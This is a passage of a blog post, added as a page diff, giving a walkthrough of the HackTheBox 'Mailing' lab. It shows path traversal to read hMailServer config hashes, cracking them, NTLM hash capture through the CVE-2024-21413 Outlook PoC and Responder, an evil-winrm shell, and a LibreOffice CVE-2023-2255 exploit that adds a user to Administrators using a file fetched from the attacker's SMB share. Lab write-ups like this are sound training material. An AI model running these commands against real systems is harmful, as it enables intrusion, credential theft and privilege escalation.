+                    height="35">Rezy Dev</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/posts/" title="✍️ Posts">
+                    <span>✍️ Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="🔍 Search (Alt &#43; /)" accesskey=/>
+                    <span>🔍 Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="🏷️ Tags">
+                    <span>🏷️ Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/whoami/" title="👨🏼‍💻 Whoami">
+                    <span>👨🏼‍💻 Whoami</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Mailing Writeup
+    </h1>
+    <div class="post-meta"><span title='2024-09-12 00:00:00 +0000 UTC'>September 12, 2024</span>&nbsp;·&nbsp;8 min&nbsp;·&nbsp;1672 words&nbsp;·&nbsp;Me&nbsp;|&nbsp;<a href="https://github.com/Rezy-Dev/Rezy-Dev.github.io/tree/master/content/posts/HackTheBox/Mailing/index.md" rel="noopener noreferrer" target="_blank">Suggest Changes</a>
+
+</div>
+  </header> 
+  <div class="post-content"><table>
+<thead>
+<tr>
+<th>Link:</th>
+<th><a href="https://app.hackthebox.com/machines/Mailing">https://app.hackthebox.com/machines/Mailing</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Difficulty</td>
+<td>Easy</td>
+</tr>
+<tr>
+<td>Machine</td>
+<td>Windows</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="enumeration">Enumeration<a hidden class="anchor" aria-hidden="true" href="#enumeration">#</a></h2>
+<p><strong>Nmap</strong></p>
+<p>I ran Nmap with the command <strong><code>nmap 10.10.11.14 -vv -p- -T4</code></strong>. It gave me a lot of information about the open ports on the target machine. However, my focus was primarily on the HTTP port, so I conducted an aggressive scan on all the ports to gather as much detail as possible.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="nx">PORT</span>      <span class="nx">STATE</span> <span class="nx">SERVICE</span>      <span class="nx">REASON</span>
+</span></span><span class="line"><span class="cl"><span class="mi">25</span><span class="o">/</span><span class="nx">tcp</span>    <span class="nx">open</span>  <span class="nx">smtp</span>         <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
+</span></span><span class="line"><span class="cl"><span class="mi">80</span><span class="o">/</span><span class="nx">tcp</span>    <span class="nx">open</span>  <span class="nx">http</span>         <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
+</span></span><span class="line"><span class="cl"><span class="mi">110</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">pop3</span>         <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
+</span></span><span class="line"><span class="cl"><span class="mi">135</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">msrpc</span>        <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
+</span></span><span class="line"><span class="cl"><span class="mi">139</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">netbios</span><span class="o">-</span><span class="nx">ssn</span>  <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
+</span></span><span class="line"><span class="cl"><span class="mi">143</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">imap</span>         <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
+</span></span><span class="line"><span class="cl"><span class="mi">445</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">microsoft</span><span class="o">-</span><span class="nx">ds</span> <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
+</span></span><span class="line"><span class="cl"><span class="mi">465</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">smtps</span>        <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
+</span></span><span class="line"><span class="cl"><span class="mi">587</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">submission</span>   <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
+</span></span><span class="line"><span class="cl"><span class="mi">993</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">imaps</span>        <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
+</span></span><span class="line"><span class="cl"><span class="mi">5040</span><span class="o">/</span><span class="nx">tcp</span>  <span class="nx">open</span>  <span class="nx">unknown</span>      <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
+</span></span><span class="line"><span class="cl"><span class="mi">5985</span><span class="o">/</span><span class="nx">tcp</span>  <span class="nx">open</span>  <span class="nx">wsman</span>        <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
+</span></span><span class="line"><span class="cl"><span class="mi">7680</span><span class="o">/</span><span class="nx">tcp</span>  <span class="nx">open</span>  <span class="nx">pando</span><span class="o">-</span><span class="nx">pub</span>    <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
+</span></span><span class="line"><span class="cl"><span class="mi">47001</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">winrm</span>        <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
+</span></span><span class="line"><span class="cl"><span class="mi">49664</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">unknown</span>      <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
+</span></span><span class="line"><span class="cl"><span class="mi">49665</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">unknown</span>      <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
+</span></span><span class="line"><span class="cl"><span class="mi">49666</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">unknown</span>      <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
+</span></span><span class="line"><span class="cl"><span class="mi">49667</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">unknown</span>      <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
+</span></span><span class="line"><span class="cl"><span class="mi">55959</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">unknown</span>      <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
+</span></span></code></pre></div><p>During the aggressive scan, I used the command <strong><code>nmap 10.10.11.14 -vv -p25,80,110,135,139,143,445,465,587,993,5040,5985,7680,47001,49664,49665,49666,49667,55959 -T4 -A</code></strong>. While Nmap was busy scanning, I focused my attention on examining the HTTP server. The detailed scan provided me with comprehensive information about the target machine&rsquo;s services and configurations.</p>
+<pre tabindex="0"><code>PORT      STATE    SERVICE       REASON      VERSION
+25/tcp    open     smtp          syn-ack     hMailServer smtpd
+| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+80/tcp    open     http          syn-ack     Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-title: Mailing
+110/tcp   open     pop3          syn-ack     hMailServer pop3d
+|_pop3-capabilities: USER TOP UIDL
+135/tcp   open     msrpc         syn-ack     Microsoft Windows RPC
+139/tcp   open     netbios-ssn   syn-ack     Microsoft Windows netbios-ssn
+143/tcp   open     imap          syn-ack     hMailServer imapd
+|_imap-capabilities: IMAP4 NAMESPACE IMAP4rev1 IDLE completed RIGHTS=texkA0001 QUOTA CHILDREN CAPABILITY SORT ACL OK
+445/tcp   open     microsoft-ds? syn-ack
+465/tcp   open     ssl/smtp      syn-ack     hMailServer smtpd
+| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb
+| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-02-27T18:24:10
+| Not valid after:  2029-10-06T18:24:10
+| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
+| SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
+| -----BEGIN CERTIFICATE-----
+| MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP
+| MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp
+| ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV
+| BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw
+| HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx
+| ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h
+| aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0
+| YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B
+| AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E
+| wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f
+| i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i
+| ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG
+| pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4
+| OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3
+| DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY
+| yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx
+| Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g
+| ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R
+| 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut
+| spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k
+|_-----END CERTIFICATE-----
+|_ssl-date: TLS randomness does not represent time
+| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+587/tcp   open     smtp          syn-ack     hMailServer smtpd
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb
+| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-02-27T18:24:10
+| Not valid after:  2029-10-06T18:24:10
+| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
+| SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
+| -----BEGIN CERTIFICATE-----
+| MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP
+| MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp
+| ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV
+| BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw
+| HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx
+| ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h
+| aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0
+| YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B
+| AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E
+| wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f
+| i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i
+| ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG
+| pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4
+| OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3
+| DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY
+| yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx
+| Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g
+| ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R
+| 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut
+| spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k
+|_-----END CERTIFICATE-----
+| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+993/tcp   open     ssl/imap      syn-ack     hMailServer imapd
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb
+| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-02-27T18:24:10
+| Not valid after:  2029-10-06T18:24:10
+| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
+| SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
+| -----BEGIN CERTIFICATE-----
+| MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP
+| MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp
+| ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV
+| BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw
+| HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx
+| ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h
+| aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0
+| YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B
+| AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E
+| wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f
+| i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i
+| ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG
+| pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4
+| OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3
+| DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY
+| yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx
+| Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g
+| ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R
+| 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut
+| spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k
+|_-----END CERTIFICATE-----
+|_imap-capabilities: IMAP4 NAMESPACE IMAP4rev1 IDLE completed RIGHTS=texkA0001 QUOTA CHILDREN CAPABILITY SORT ACL OK
+5040/tcp  open     unknown       syn-ack
+5985/tcp  open     http          syn-ack     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+7680/tcp  open     pando-pub?    syn-ack
+47001/tcp open     http          syn-ack     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open     msrpc         syn-ack     Microsoft Windows RPC
+49665/tcp open     msrpc         syn-ack     Microsoft Windows RPC
+49666/tcp open     msrpc         syn-ack     Microsoft Windows RPC
+49667/tcp open     msrpc         syn-ack     Microsoft Windows RPC
+55959/tcp filtered unknown       no-response
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 29452/tcp): CLEAN (Timeout)
+|   Check 2 (port 39838/tcp): CLEAN (Timeout)
+|   Check 3 (port 37492/udp): CLEAN (Timeout)
+|   Check 4 (port 25477/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-time: 
+|   date: 2024-05-05T11:59:54
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+|_clock-skew: -4m48s
+</code></pre><p>After several attempts of searching for LFI (Local File Inclusion) vulnerabilities, I decided to click on an obvious download button. Surprisingly, this approach actually worked, leading me to further exploit the system.</p>
+<p><img loading="lazy" src="Untitled.png" alt="Untitled"  />
+</p>
+<p>I stumbled upon an intriguing configuration file path while analyzing the payload: <strong><code>..\..\..\..\..\..\..\Program%20Files%20(x86)\hMailServer\Bin\hMailServer.INI</code></strong>. This discovery was inspired by an old exploit I found at <a href="https://www.exploit-db.com/exploits/7012">https://www.exploit-db.com/exploits/7012</a>. Essentially, this exploit provided me with the file structure for locating the hMailServer, specifically the <strong><code>hMailServer.INI</code></strong> file.</p>
+<pre tabindex="0"><code>[Directories]
+ProgramFolder=C:\Program Files (x86)\hMailServer
+DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
+DataFolder=C:\Program Files (x86)\hMailServer\Data
+LogFolder=C:\Program Files (x86)\hMailServer\Logs
+TempFolder=C:\Program Files (x86)\hMailServer\Temp
+EventFolder=C:\Program Files (x86)\hMailServer\Events
+[GUILanguages]
+ValidLanguages=english,swedish
+[Security]
+AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
+[Database]
+Type=MSSQLCE
+Username=
+Password=0a9f8ad8bf896b501dde74f08efd7e4c
+PasswordEncryption=1
+Port=0
+Server=
+Database=hMailServer
+Internal=1
+</code></pre><p>I attempted to crack the MD5 hashes using hashcat with the command <strong><code>hashcat.exe -m0 myhash.txt rockyou.txt</code></strong>. Fortunately, I successfully cracked one of the hashes, revealing the Administrator Password as <strong><code>homenetworkingadministrator</code></strong>.</p>
+<p>However, the second hash proved to be resistant to cracking. After some research on Google, I came across a tool called hMailDatabasePasswordDecrypter, available at <a href="https://github.com/GitMirar/hMailDatabasePasswordDecrypter">https://github.com/GitMirar/hMailDatabasePasswordDecrypter</a>. This tool specializes in decrypting blowfish-encrypted hMail database passwords.</p>
+<pre tabindex="0"><code>┌──(root㉿kali)-[/HTB]
+└─# git clone https://github.com/GitMirar/hMailDatabasePasswordDecrypter.git
+Cloning into &#39;hMailDatabasePasswordDecrypter&#39;...
+remote: Enumerating objects: 8, done.
+remote: Total 8 (delta 0), reused 0 (delta 0), pack-reused 8
+Receiving objects: 100% (8/8), 9.53 KiB | 1.36 MiB/s, done.
+                                                                                                                         
+┌──(root㉿kali)-[/HTB]
+└─# cd hMailDatabasePasswordDecrypter 
+                                                                                                                         
+┌──(root㉿kali)-[/HTB/hMailDatabasePasswordDecrypter]
+└─# ls
+blowfish.cpp  blowfish.h  blowfish.h2  main.cpp  Makefile  README.md
+                                                                                                                         
+┌──(root㉿kali)-[/HTB/hMailDatabasePasswordDecrypter]
+└─# make                             
+g++ blowfish.cpp main.cpp -o decrypt
+                                                                                                                         
+┌──(root㉿kali)-[/HTB/hMailDatabasePasswordDecrypter]
+└─# ./decrypt 0a9f8ad8bf896b501dde74f08efd7e4c
+6FC6F69152AD
+</code></pre><p>Following the steps outlined in the GitHub README page, I attempted to crack the password successfully. However, when I tried to connect to the POP3 server using Telnet, I encountered difficulties as it wasn&rsquo;t functioning as expected.</p>
+<h2 id="user-root">User Root<a hidden class="anchor" aria-hidden="true" href="#user-root">#</a></h2>
+<p>After further enumeration regarding hMailServer, I came across an exploit that could be useful, available at <a href="https://sploitus.com/exploit?id=425B7616-AF36-5AD0-912F-A6B7A45E41E6">https://sploitus.com/exploit?id=425B7616-AF36-5AD0-912F-A6B7A45E41E6</a>. Following the steps outlined in the CVE-2024-21413 Microsoft Outlook Remote Code Execution Vulnerability GitHub repository at <a href="https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability">https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability</a>, I proceeded to run Responder on my Kali machine using the command <strong><code>sudo responder -I tun0</code></strong>.</p>
+<p>(Note: If Responder doesn&rsquo;t return the hashes, you can use smbserver as suggested in the proof of concept on the GitHub page. I initially encountered the same issue, but after several attempts, it worked for me.)</p>
+<p>After running Responder, I executed the following command:</p>
+<pre tabindex="0"><code>┌──(root㉿kali)-[/HTB/Mailing/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability]
+└─# python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient mayay email pls look hi&#39;
+
+CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.
+Alexander Hagenah / @xaitax / ah@primepage.de                                                                                                                                                
+
+✅ Email sent successfully.
+</code></pre><p>After sending the email, I monitored Responder, and to my satisfaction, I observed that it captured a user hash.</p>
+<pre tabindex="0"><code>maya::MAILING:dac4fe0aec512cc8:0ABF7016C9D7428230E543395441DBCD:010100000000000000EF6F99469EDA01293B5F358D9EF4DE0000000002000800540058005800340001001E00570049004E002D00380038003200520041004E005000380044004500500004003400570049004E002D00380038003200520041004E00500038004400450050002E0054005800580034002E004C004F00430041004C000300140054005800580034002E004C004F00430041004C000500140054005800580034002E004C004F00430041004C000700080000EF6F99469EDA01060004000200000008003000300000000000000000000000002000009BE5ABAC0CB766267616E7031B83C21B57E7A52A6903503167DE1974F23E1F3B0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0035000000000000000000
+</code></pre><p>I cracked the above hash with the following command:</p>
+<pre tabindex="0"><code>hashcat.exe -m 5600 myhash.txt rockyou.txt --self-test-disable
+</code></pre><p>Our password is: <strong><code>m4y4ngs4ri</code></strong>. I used this password with the following command to establish a shell: <strong><code>evil-winrm -i 10.10.11.14 -u maya -p m4y4ngs4ri</code></strong>. This successfully granted me access to the system, and I was able to retrieve the user flag.</p>
+<h2 id="root-flag">Root Flag<a hidden class="anchor" aria-hidden="true" href="#root-flag">#</a></h2>
+<p>I came across LibreOffice installed in the Program Files directory, and upon further investigation, I discovered a CVE associated with its version: CVE-2023-2255 (<a href="https://github.com/elweth-sec/CVE-2023-2255">https://github.com/elweth-sec/CVE-2023-2255</a>).</p>
+<p>To exploit this vulnerability, I executed the following Python code:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-arduino" data-lang="arduino"><span class="line"><span class="cl"><span class="n">python3</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mf">2255.</span><span class="n">py</span> <span class="o">--</span><span class="n">cmd</span> <span class="err">&#39;</span><span class="n">net</span> <span class="n">localgroup</span> <span class="n">Administrators</span> <span class="n">maya</span> <span class="o">/</span><span class="n">add</span><span class="err">&#39;</span> <span class="o">--</span><span class="n">output</span> <span class="err">&#39;</span><span class="n">exploit</span><span class="p">.</span><span class="n">odt</span><span class="err">&#39;</span>
+</span></span></code></pre></div><p>This generated an exploit file named <strong><code>exploit.odt</code></strong>.</p>
+<p>Next, I launched an Impacket SMB server using the command:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-smbserver mailing <span class="sb">`</span><span class="nb">pwd</span><span class="sb">`</span> -smb2support
+</span></span></code></pre></div><p>Then, within the Evil-WinRM shell, I executed the following commands:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="nx">net</span> <span class="nx">use</span> <span class="err">\\</span><span class="mf">10.10.14.98</span><span class="err">\</span><span class="nx">mailing</span>
+</span></span><span class="line"><span class="cl"><span class="nx">copy</span> <span class="err">\\</span><span class="mf">10.10.14.98</span><span class="err">\</span><span class="nx">mailing</span><span class="err">\</span><span class="nx">exploit</span><span class="p">.</span><span class="nx">odt</span>
+</span></span></code></pre></div><p>These commands allowed me to access the exploit file from the SMB server.</p>
+<p><img loading="lazy" src="Untitled%201.png" alt="Untitled"  />
+</p>
+<p>After copying the <strong><code>exploit.odt</code></strong> file from the SMB server, I waited for a few moments. Then, to confirm that the user <strong><code>maya</code></strong> had elevated privileges to administrator, I executed the command <strong><code>net user maya</code></strong>.</p>
+<p>With confirmation of elevated privileges, I proceeded to dump the hashes using the crackmapexec command:</p>
